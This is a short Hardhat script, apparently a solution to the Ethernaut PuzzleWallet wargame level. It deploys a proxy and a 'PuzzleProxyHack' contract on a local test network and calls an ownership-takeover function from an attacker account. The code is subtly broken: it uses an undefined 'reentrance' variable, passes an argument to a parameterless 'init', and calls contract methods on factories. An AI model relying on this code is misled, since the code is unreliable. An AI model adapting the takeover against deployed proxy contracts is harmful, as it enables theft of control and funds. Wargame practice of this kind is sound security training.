const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
  const puzzleWallet = await PuzzleWallet.deploy(reentrance.address);
  await puzzleWallet.deployed();

  const encodeFunction = new ethers.utils.Interface([
    "function init()",
  ]).encodeFunctionData(`init`, [10]);

  const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
  const puzzleProxy = await PuzzleProxy.deploy(owner.address, puzzleWallet.address, encodeFunction);
  await puzzleProxy.deployed();

  const PuzzleProxyHack = await ethers.getContractFactory("PuzzleProxyHack");
  const puzzleProxyHack = await PuzzleProxyHack.connect(addr1).deploy(owner.address, puzzleWallet.address, encodeFunction);
  await puzzleProxyHack.deployed();


  const hacker = await PuzzleProxy.connect(addr1);
  const hackerHack = await PuzzleProxyHack.connect(addr1);

  // ------------ let's hack -------------
  console.log(await hacker.owner());

  await hackerHack.ownerChange();

  console.log(await hacker.owner());
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
